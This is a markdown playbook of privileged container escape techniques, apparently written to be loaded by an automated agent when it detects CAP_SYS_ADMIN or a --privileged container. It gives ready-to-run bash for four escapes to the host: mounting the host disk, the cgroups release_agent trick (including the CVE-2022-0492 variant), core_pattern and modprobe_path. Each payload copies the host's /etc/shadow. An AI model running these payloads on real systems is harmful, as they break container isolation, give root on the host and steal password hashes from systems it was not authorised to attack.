# Privileged Container Escapes

**Load when**: Command `capsh --print` shows `CAP_SYS_ADMIN` or the container was launched with `--privileged`.

## 1. The Mount Host Drive Escape
If the container sees host blocks (check `fdisk -l` or `ls /dev/sd*`), simply mount the host root partition.
```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Modify host's /etc/crontab or /root/.ssh/authorized_keys
chroot /mnt/host
```

## 2. The cgroups release_agent Escape
If `CAP_SYS_ADMIN` is present but the host drives aren't exposed, abuse the cgroups v1 release_agent feature.

**Unprivileged variant (CVE-2022-0492)**: On kernels <5.17-rc3 (unpatched RHEL/CentOS 8, older Ubuntu LTS) the same escape works **without** `CAP_SYS_ADMIN` if the container has an unshared user+cgroup namespace and no seccomp/AppArmor blocks `unshare`. Prepend the payload below with `unshare -UrC` to acquire caps in a new namespace, then mount cgroupfs. Always try this on old kernels even when `capsh --print` shows no `sys_admin`.

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# Get the host path of the current container
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo 1 > /tmp/cgrp/x/notify_on_release
# Point release_agent to a payload on the host side
echo "$host_path/cmd" > /tmp/cgrp/release_agent
# Create the payload
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod +x /cmd
# Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
Wait a moment, then read `/output` for the host's `/etc/shadow`.

## 3. The core_pattern Escape
When cgroups v1 `release_agent` is unavailable (e.g. cgroups v2, or `rdma` subsystem missing), use `core_pattern` instead. Requires `CAP_SYS_ADMIN` (or `--privileged`).

```bash
# Get overlay upperdir (host path where container writes land)
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

# Write exploit that runs as root on the HOST when a crash occurs
printf '#!/bin/sh\ncat /etc/shadow > %s/loot\nchmod 777 %s/loot\n' "$UDIR" "$UDIR" > /exploit.sh
chmod +x /exploit.sh

# Set core_pattern — pipe format makes kernel run the script on any SIGSEGV
echo "|${UDIR}/exploit.sh" > /proc/sys/kernel/core_pattern

# Trigger crash → kernel invokes exploit.sh AS ROOT ON THE HOST
ulimit -c unlimited
bash -c 'kill -11 $$'

# Wait, then read the loot (written into container overlay by the host-level script)
sleep 4
cat /loot
```

**Why it works**: `/proc/sys/kernel/core_pattern` is a kernel-wide parameter, not namespaced. When prefixed with `|`, the kernel runs the specified binary as root in the init namespace (the host). The overlay `upperdir` is a real host path, so the exploit script is accessible from the host and writes output back to a location visible inside the container.

**When to prefer over cgroups**: cgroups v2 (default on Ubuntu 22.04+) does not expose `release_agent` in the same way. `core_pattern` works on both cgroups v1 and v2.

## 4. The modprobe_path Escape
Similar principle to `core_pattern`. Overwrite `/proc/sys/kernel/modprobe` with a path to your script. Trigger by executing a file with unknown magic bytes (`\xff\xff\xff\xff`). The kernel runs the modprobe helper as root on the host.

```bash
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
printf '#!/bin/sh\ncat /etc/shadow > %s/shadow.txt\n' "$UDIR" > /pwn.sh && chmod +x /pwn.sh
echo "$UDIR/pwn.sh" > /proc/sys/kernel/modprobe
printf '\xff\xff\xff\xff' > /tmp/trigger && chmod +x /tmp/trigger
/tmp/trigger 2>/dev/null; sleep 2; cat /shadow.txt
```
